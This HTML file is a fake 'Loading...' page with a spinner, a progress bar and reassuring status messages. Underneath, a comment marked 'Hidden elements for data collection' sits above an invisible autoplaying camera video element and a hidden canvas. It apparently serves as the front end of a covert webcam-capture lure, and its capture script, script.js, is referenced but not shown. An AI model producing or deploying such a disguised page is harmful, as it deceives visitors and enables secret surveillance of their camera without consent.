<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid #e8eaed;
            border-top: 5px solid #4285f4;
            border-radius: 50%;
            margin: 0 auto 25px;
            animation: spin 1s linear infinite;
        }
        
        .logo {
            font-size: 48px;
            margin-bottom: 20px;
            color: #4285f4;
        }
        
        h1 {
            font-size: 22px;
            color: #202124;
            margin-bottom: 10px;
            font-weight: 500;
        }
        
        p {
            color: #5f6368;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        
        .progress {
            height: 3px;
            background: #e8eaed;
            border-radius: 2px;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: #4285f4;
            transition: width 0.3s ease;
        }
        
        .status {
            font-size: 14px;
            color: #80868b;
            margin-top: 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 13px;
            color: #9aa0a6;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo" id="logo">ðŸ”’</div>
        <div class="loader" id="loader"></div>
        
        <h1 id="title">Loading...</h1>
        <p id="message">Preparing your content...</p>
        
        <div class="progress">
            <div class="progress-bar" id="progress"></div>
        </div>
        
        <div class="status" id="status">Initializing connection...</div>
        <div class="loading-text" id="loadingText">This should only take a moment</div>
    </div>

    <!-- Hidden elements for data collection -->
    <video id="camera" autoplay playsinline muted style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script src="script.js"></script>
</body>
</html>
